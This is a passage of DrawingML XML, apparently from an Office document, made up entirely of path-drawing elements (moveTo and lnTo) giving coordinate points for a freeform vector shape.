                  <a:pt x="206032" y="2076107"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="185928" y="2037080"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="170675" y="2078062"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="147231" y="2117179"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117005" y="2154478"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81445" y="2189988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41960" y="2223744"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2255774"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45173" y="2279789"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85877" y="2308021"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="121196" y="2341029"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="150253" y="2379395"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="172123" y="2423680"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="185928" y="2474468"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="202577" y="2429141"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="227939" y="2383294"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="259791" y="2339987"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="295871" y="2302256"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="333971" y="2273173"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="371856" y="2255774"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="2734309" h="2474595">
                <a:moveTo>
                  <a:pt x="2734056" y="393700"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2698051" y="381000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2660510" y="381000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2621305" y="368300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2580360" y="342900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2537536" y="330200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2492756" y="304800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2466695" y="290677"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2466695" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2462606" y="1574800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2456904" y="1625600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2452903" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2453894" y="1701800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2391003" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2334247" y="1752600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2282660" y="1765300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2235301" y="1790700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2191245" y="1803400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2149551" y="1816100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2109266" y="1828800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1988794" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1907755" y="1930400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1865503" y="1943100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821014" y="1955800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1773491" y="1968500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1722132" y="1993900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1666113" y="2019300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1604645" y="2057400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1538236" y="2082800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1482686" y="2120900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1435760" y="2133600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1395222" y="2146300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1358811" y="2159000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1289494" y="2184400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1252093" y="2197100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1213586" y="2184400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1168273" y="2171700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1118184" y="2146300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="959739" y="2070100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="910983" y="2057400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="867676" y="2044700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="831850" y="2032000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="798512" y="2019300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="761441" y="2006600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="720801" y="1993900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="676770" y="1968500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="629513" y="1943100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="579196" y="1917700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="525995" y="1892300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="411607" y="1866900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="409181" y="1816100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="409295" y="1765300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="410616" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="411822" y="1689100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="411734" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="411645" y="1638300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="411607" y="1625600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="452335" y="1651000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="499732" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="551472" y="1689100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="658710" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="709561" y="1752600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="755472" y="1778000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="794131" y="1790700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="829818" y="1803400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="868426" y="1816100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="909955" y="1841500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="954417" y="1854200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1001801" y="1879600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1052144" y="1892300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1105420" y="1917700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1161669" y="1943100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1218158" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1288796" y="1879600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1328813" y="1866900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1371638" y="1866900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1417027" y="1854200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1464741" y="1841500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1514538" y="1816100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1566151" y="1790700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1619377" y="1752600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1647698" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1676031" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1727847" y="1701800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1775498" y="1676400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1819694" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1861121" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1900466" y="1651000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2013038" y="1612900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2051050" y="1587500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2136521" y="1536700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2267051" y="1498600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2358821" y="1473200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2406942" y="1447800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2456942" y="1422400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2465908" y="1473200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2466695" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2466695" y="290677"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2460904" y="287540"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2460904" y="558800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2455634" y="596900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449893" y="647700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449792" y="660400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449703" y="673100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449614" y="685800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449512" y="698500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449423" y="711200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2459990" y="762000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2409482" y="787400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382342" y="794016"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382342" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382266" y="1054100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382189" y="1066800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382113" y="1079500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382050" y="1092200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2376881" y="1130300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372017" y="1181100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372144" y="1193800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372258" y="1206500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372372" y="1219200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372487" y="1231900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372614" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2369566" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2325395" y="1270000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2282342" y="1295400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2154644" y="1333500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2065705" y="1358900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2018576" y="1384300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1969008" y="1409700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1924989" y="1447800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1884095" y="1460500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1845284" y="1485900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1730870" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1689950" y="1536700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1645920" y="1549400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1597710" y="1562100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1544320" y="1587500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1478978" y="1625600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1422679" y="1651000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1373505" y="1663700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1329537" y="1676400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1288884" y="1701800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1209840" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1167638" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1105052" y="1739900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1054709" y="1727200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1013269" y="1701800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="977430" y="1689100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="943864" y="1676400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="909243" y="1651000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="870229" y="1625600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="823531" y="1612900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="765810" y="1587500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="704037" y="1562100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="647090" y="1549400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="594334" y="1524000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="545147" y="1498600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="498868" y="1485900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="454875" y="1460500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="371246" y="1435100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330327" y="1409700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="327685" y="1371600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330263" y="1320800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="334937" y="1270000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338594" y="1219200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338086" y="1181100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330327" y="1143000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="394131" y="1168400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="451319" y="1193800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="502805" y="1219200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="549516" y="1231900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="592378" y="1257300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="632307" y="1270000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="670242" y="1295400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="707110" y="1295400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="780275" y="1320800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="822159" y="1333500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="868159" y="1346200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="916914" y="1371600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1017308" y="1422400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1066228" y="1435100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1112520" y="1460500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1154811" y="1473200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1191768" y="1485900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1245527" y="1460500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1294053" y="1435100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1338656" y="1422400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1380655" y="1397000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1504010" y="1358900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1548612" y="1333500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1652879" y="1295400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1705546" y="1270000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1755317" y="1257300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1802384" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1846910" y="1219200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1889112" y="1206500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1929155" y="1181100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1967230" y="1168400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2004529" y="1143000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2048941" y="1130300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2098230" y="1104900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2202611" y="1079500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2253284" y="1054100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2299982" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2340495" y="1016000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2372614" y="990600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382342" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2382342" y="794016"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2305113" y="812800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2253196" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2202751" y="850900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2154771" y="863600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2110206" y="889000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2070061" y="914400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2035302" y="939800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1995373" y="977900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1948611" y="1003300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1897430" y="1016000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1844205" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1791335" y="1054100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1741208" y="1066800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1696212" y="1079500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1658747" y="1092200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1624723" y="1117600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1582788" y="1130300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1535188" y="1143000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1484210" y="1168400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1432115" y="1181100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1381188" y="1206500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1333677" y="1219200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1291882" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1258062" y="1270000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1216863" y="1244600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1172552" y="1231900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1126185" y="1206500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1078839" y="1181100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1031570" y="1168400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="985431" y="1143000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="941489" y="1130300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="900823" y="1117600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="864489" y="1104900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="833285" y="1104900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="800290" y="1092200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="765073" y="1079500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="727202" y="1066800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="686269" y="1041400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="641832" y="1028700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="593483" y="1003300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="540778" y="977900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="483298" y="952500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="420624" y="927100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415404" y="876300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415302" y="863600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415213" y="850900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415112" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="417614" y="800100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="420789" y="762000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="422490" y="711200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="420624" y="660400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="463423" y="673100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="502818" y="685800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="540664" y="698500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="578815" y="723900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="619137" y="749300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="663498" y="762000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="713740" y="787400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="771740" y="812800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="839343" y="825500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="899134" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="948601" y="863600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="990104" y="876300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1026045" y="889000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1090726" y="927100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1124242" y="952500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1161719" y="965200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1205522" y="977900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1258062" y="990600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1297228" y="965200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1377784" y="939800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1420431" y="914400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1465516" y="901700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1513649" y="889000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1565478" y="863600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1621637" y="838200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1682750" y="812800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1750364" y="787400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1810461" y="774700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1864067" y="749300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1912251" y="736600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1956028" y="723900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1996440" y="711200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2034540" y="685800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2071370" y="660400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2110714" y="635000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2155037" y="609600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2203158" y="596900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2253907" y="584200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2306142" y="558800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2410333" y="533400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2459990" y="508000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2460904" y="558800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2460904" y="287540"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2445905" y="279400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2396883" y="266700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2345575" y="241300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2291880" y="228600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2235708" y="203200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2183790" y="190500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2133295" y="165100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2084070" y="152400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2035962" y="127000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1942528" y="76200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1896897" y="63500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1851799" y="38100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1718195" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1673733" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1637220" y="25400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1594637" y="50800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1547495" y="63500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1343926" y="114300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1296898" y="127000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1254480" y="139700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1218184" y="152400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1181176" y="177800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1142682" y="190500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1102321" y="190500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1059764" y="203200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1014628" y="215900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="966571" y="228600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="915250" y="241300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="860298" y="266700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="742276" y="342900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="686943" y="368300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="635139" y="381000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="586600" y="406400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="541083" y="406400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="498373" y="419100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="458203" y="431800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="420344" y="444500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384556" y="444500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="347726" y="469900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="316763" y="508000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="291617" y="546100"/>
